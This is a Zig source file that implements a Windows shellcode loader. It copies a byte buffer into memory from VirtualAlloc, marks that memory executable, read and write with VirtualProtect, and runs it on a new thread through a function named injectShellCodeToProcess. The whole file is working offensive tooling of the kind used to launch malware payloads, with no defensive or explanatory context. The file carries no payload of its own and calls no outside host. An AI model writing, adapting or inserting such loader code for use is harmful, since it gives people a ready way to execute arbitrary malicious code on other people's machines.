const std = @import("std");
const win = @import("zigwin32").everything;

const PAGE_PROTECTION_FLAGS = win.PAGE_PROTECTION_FLAGS;
const LPTHREAD_START_ROUTINE = win.LPTHREAD_START_ROUTINE;
const INFINITE = win.INFINITE;
const SECURITY_ATTRIBUTES = win.SECURITY_ATTRIBUTES;

const VirtualAlloc = win.VirtualAlloc;
const VirtualProtect = win.VirtualProtect;
const VirtualFree = win.VirtualFree;
const CreateThread = win.CreateThread;
const CloseHandle = win.CloseHandle;
const WaitForSingleObject = win.WaitForSingleObject;
const GetLastError = win.GetLastError;

pub fn allocateMemory(data: []const u8) !*anyopaque {
    const region = VirtualAlloc(
        null,
        data.len,
        .{ .COMMIT = 1, .RESERVE = 1 },
        .{ .PAGE_READWRITE = 1 },
    ) orelse {
        std.debug.print("[!] VirtualAlloc Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.VirtualAllocFailed;
    };
    @memcpy(@as([*]u8, @ptrCast(region)), data);

    return region;
}

pub fn allocateExecutableMemory(data: []const u8) !*anyopaque {
    const region = try allocateMemory(data);

    var old_protection: PAGE_PROTECTION_FLAGS = undefined;
    if (VirtualProtect(
        region,
        data.len,
        .{ .PAGE_EXECUTE_READWRITE = 1 },
        &old_protection,
    ) == 0) {
        std.debug.print("[!] VirtualProtect Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.VirtualProtectFailed;
    }

    return region;
}

pub fn freeVirtualMemory(region: *anyopaque) void {
    _ = VirtualFree(region, 0, .RELEASE);
}

pub fn executeInNewThread(start_address: LPTHREAD_START_ROUTINE, parameter: ?*anyopaque) !void {
    const h_thread = CreateThread(
        null,
        0,
        start_address,
        parameter,
        .{},
        null,
    ) orelse {
        std.debug.print("[!] CreateThread Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.CreateThreadFailed;
    };
    defer _ = CloseHandle(h_thread);

    _ = WaitForSingleObject(h_thread, INFINITE);
}

pub fn injectShellCodeToProcess(shell_code: []const u8) !void {
    const shell_code_region = try allocateExecutableMemory(shell_code);
    defer _ = freeVirtualMemory(shell_code_region);

    try executeInNewThread(@ptrCast(shell_code_region), null);
}
